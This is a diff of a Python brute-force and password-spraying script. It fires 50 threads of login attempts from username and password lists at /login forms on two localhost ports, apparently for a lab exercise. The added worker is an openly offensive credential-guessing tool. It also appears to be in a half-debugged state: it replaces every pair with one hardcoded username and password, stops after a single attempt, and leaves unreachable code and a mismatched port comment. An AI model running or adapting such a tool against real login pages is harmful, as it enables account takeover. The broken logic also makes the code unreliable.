@@ -1,16 +1,108 @@
 import queue
 import threading
-from itertools import product
-import HTTP  # Assuming HTTP is a module with the make_request function
+from HTTP import HTTPQuery  # Import HTTPQuery class from HTTP.py
 
 lock = threading.Lock()
-# Event to signal when valid credentials are found
 found_event = threading.Event()
 
-users:queue.Queue = queue.Queue()
+# Global variables for the queue, passwords list, and password index
+users = queue.Queue()
 passwords = []
-    #global index to see how many tries have been made
-index:int = 0
+index = 0
+passIndex = 0
+tried_combinations = set()  # Set to track attempted username-password pairs
+
+# Initialize HTTPQuery object with desired settings
+# Setup for the first app on port 8081
+http_query_8081 = HTTPQuery(
+    host="http://127.0.0.1:8081",
+    default_headers={"Content-Type": "application/x-www-form-urlencoded"},
+    path="/login",
+    use_post=True,
+    use_json=False
+)
+# Setup for the second app on port 8082
+http_query_8082 = HTTPQuery(
+    host="http://127.0.0.1:8082",
+    default_headers={"Content-Type": "application/x-www-form-urlencoded"},
+    path="/login",
+    use_post=True,
+    use_json=False
+)
+
+# Use only 8081 for now
+http_query = http_query_8082
+
+# Thread-safe function to get the next unique username-password pair
+def getPass():
+    global passIndex
+    with lock:
+        if passIndex >= len(passwords) or users.empty():
+            return None, None
+
+        password = passwords[passIndex]
+        passIndex += 1
+
+        if passIndex == len(passwords):
+            passIndex = 0
+            user = users.get()  # Get and remove the next user
+        else:
+            user = users.get()
+            users.put(user)  # Put the user back for the next iteration
+
+        # Check if the combination has been tried
+        if (user, password) in tried_combinations:
+            return getPass()  # Recursively get the next unique pair
+
+        # Mark the combination as tried
+        tried_combinations.add((user, password))
+
+        return user, password
+
+def worker():
+    global index
+    while not found_event.is_set():
+        user, password = getPass()
+        
+        if user is None or password is None:
+            break
+        
+        #print("Attempting login for username:", user, "and password:", password)
+        user = "adejr12"
+        password = "Zbff315"
+        print("Attempting login for username:", user, "and password:", password)
+        if http_query.perform_query(username=user, password=password, search_string="Welcome"):
+            found_event.set()
+            print(f"Found valid credentials: {user}:{password}")
+            return  # Exit the worker thread immediately on success
+        return
+        with lock:
+            index += 1
+
+def brute_force(u, p, passwordSpray=False):
+    global users
+    global passwords
+    global tried_combinations
+    tried_combinations.clear()  # Clear previous attempts
+
+    if passwordSpray:
+        u, p = p, u
+
+    users = queue.Queue()  # Initialize users as a Queue
+    for user in u:
+        users.put(user)
+    passwords = p
+
+    threads = []
+    for _ in range(50):  # Adjust the number of threads as needed
+        thread = threading.Thread(target=worker)
+        thread.start()
+        threads.append(thread)
+
+    for thread in threads:
+        thread.join()
+
+    return found_event.is_set()
 
 # Function to read user list from a file
 def read_user_list(file_path, delimiter=None, password_list=None):
@@ -35,89 +127,15 @@ def read_password_list(file_path):
             passwords.append(line.strip())
     return passwords
 
-def getPass():
-    user = None
-    password = None
-    #we don't have more users or passwords
-    if (passIndex >= passwords.count() or users.Count == 0):
-        user= None
-        password = None
-        return user, password
-    
-    #get the next password and update the index for the next thread
-    password = passwords[passIndex]
-    passIndex += 1
-
-    #the last one
-    #todo: check if this is correct or it should be passIndex == passwords.count()-1
-    if (passIndex == passwords.count()):
-    
-        passIndex = 0
-        user=users.pop()
-    else: #replacement for peek
-        user = users.pop()
-        users.put(user)
-    return user, password
-
-#could be used by external functions if there's an error with the actual user and you need to skip to the next one
-def tryNextUser():
-    passIndex = passwords.count()-1
-
-# Worker function to process the tasks
-def worker(users, passwords):
-    while(found_event.is_set() == False):
-        try:
-            lock.acquire()
-            user, password = getPass()
-            lock.release()
-        except queue.Empty:
-            break
-        finally:
-            lock.release()
-
-        if HTTP.make_request(user, password):  # Assuming this function returns True on success
-            found_event.set()
-            break
-        index = index + 1
-   
-   
-#    for user, password in product(users, passwords):
-#        if found_event.is_set():
-#            break
-#        if HTTP.make_request(user, password):  # Assuming this function returns True on success
-#            found_event.set()
-#            break
-
-# Main function to manage threads
-def brute_force(u, p, passwordSpray = False):
-    if passwordSpray:
-        u, p = p, u
-    
-    index = 0
-    users = queue.Queue()
-    for user in u:
-        users.put(user)
-    passwords = p
-    threads = []
-
-    for _ in range(50):  # Adjust the number of threads as needed
-        thread = threading.Thread(target=worker, args=(users, passwords))
-        thread.start()
-        threads.append(thread)
-
-    for thread in threads:
-        thread.join()
-
-    return found_event.is_set()
 
 # Example usage
 if __name__ == "__main__":
-    user_file = "../Data/users.txt"  # Path to the user list file
-    password_file = "../Data/passwords.txt"  # Path to the password list file
-    delimiter = None  # Set to a delimiter if the user file contains user[delimiter]password pairs
+    user_file = "../Data/usernames.txt"
+    password_file = "../Data/passwords.txt"
+    delimiter = None
 
     users, passwords = read_user_list(user_file, delimiter)
-    if not passwords:  # If passwords were not read from the user file
+    if not passwords:
         passwords = read_password_list(password_file)
     
     success = brute_force(users, passwords, False)
